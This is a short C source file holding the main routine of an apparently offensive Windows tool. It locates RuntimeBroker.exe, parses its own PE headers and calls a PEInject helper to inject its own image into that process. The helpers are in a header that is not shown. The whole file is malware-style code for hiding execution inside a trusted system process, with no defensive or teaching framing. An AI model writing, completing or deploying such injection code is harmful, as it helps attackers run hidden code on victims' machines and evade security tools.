#include "utils.h"

int main()
{

	DWORD PID;
	HANDLE hProcess;
	PIMAGE_NT_HEADERS pImgNt = NULL;
	PIMAGE_SECTION_HEADER pImgSecHeader = NULL;
	PIMAGE_DATA_DIRECTORY pImgDataDir = NULL;
	LPVOID lpFile = GetModuleHandle(NULL);

	if (!GetRemoteProcID(L"RuntimeBroker.exe", &PID, &hProcess))
	{
		printf("Could Not Get Process ID!\n");
		return 1;
	}

	if (!GrabPeHeader(&pImgNt, &pImgSecHeader, &pImgDataDir, lpFile))
	{
		PRINT_ERROR("GrabPeHeader");
		return 1;
	}

	if (!PEInject(pImgSecHeader, pImgDataDir, pImgNt, hProcess))
	{
		PRINT_ERROR("PEInject");
		return 1;
	}

	printf("Press Enter to Quit...\n");
	getchar();

	if (hProcess)
		CloseHandle(hProcess);

	return 0;

}